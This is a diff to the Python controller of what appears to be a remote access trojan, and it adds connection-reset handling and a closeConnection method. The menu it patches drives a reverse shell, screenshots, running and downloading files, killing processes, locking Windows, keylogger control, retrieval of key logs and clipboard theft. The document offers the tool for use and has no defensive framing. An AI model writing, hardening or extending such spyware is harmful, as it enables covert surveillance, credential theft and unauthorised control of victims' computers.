@@ -73,6 +73,11 @@ class Server:
 
             return False
 
+    def closeConnection(self):
+        self.connections.remove(self.client_socket)
+        self.client_socket.close()
+        self.server.close()
+
     def choose(self):
         """ Main Menu """
 
@@ -101,6 +106,10 @@ class Server:
                 try:
                     self.reverseShell()
                     os.system("clear")
+                except ConnectionResetError:
+                    """ if the target hard-closes the connection we will receive only a RST packet (TCP), so here we close the connection safely """
+                    
+                    self.closeConnection() # we are not breaking because there's the backup feature at the begging of the loop, just to avoid repeating lines of code. Obviuosly the checkConnection will return false
                 except:
                     print("[!] Something went wrong.")
 
@@ -108,6 +117,8 @@ class Server:
                 try:
                     self.info = self.getTargetInfo()
                     print("*** Done ***")
+                except ConnectionResetError:
+                    self.closeConnection() # same here and so on in the code
                 except:
                     print("[!] Something went wrong.")
 
@@ -155,6 +166,8 @@ class Server:
             elif i == '--screenshot':
                 try:
                     self.takeScreenshot()
+                except ConnectionResetError:
+                    self.closeConnection()
                 except:
                     print("[!] Something went wrong.")
 
@@ -167,36 +180,56 @@ class Server:
             elif i == '--run':
                 try:
                     self.runFile()
+                except ConnectionResetError:
+                    self.closeConnection()
                 except:
                     print("[!] Something went wrong.")
 
             elif i == '--download':
                 try:
                     self.downloadFiles()
+                except ConnectionResetError:
+                    self.closeConnection()
                 except:
                     print("[!] Something went wrong")
 
             elif i == '--kill':
-                self.killProcessWin()
+                try:
+                    self.killProcessWin()
+                except ConnectionResetError:
+                    self.closeConnection()
 
             elif i == '--msg':
-                self.sendOsMessage()
+                try:
+                    self.sendOsMessage()
+                except ConnectionResetError:
+                    self.closeConnection()
 
             elif i == '--lock':
-                self.lockWindows()
+                try:
+                    self.lockWindows()
+                except ConnectionResetError:
+                    self.closeConnection()
 
             elif i == '--stop':
-                self.stopKeyLogger()
+                try:
+                    self.stopKeyLogger()
+                except ConnectionResetError:
+                    self.closeConnection()
 
             elif i == '--getlogs':
                 try:
                     self.getKeyLogs()
+                except ConnectionResetError:
+                    self.closeConnection()
                 except:
                     print("[!] Something went wrong")
 
             elif i == '--ccb':
                 try:
                     self.getClipBoard()
+                except ConnectionResetError:
+                    self.closeConnection()
                 except:
                     print("[!] Something went wrong")
 
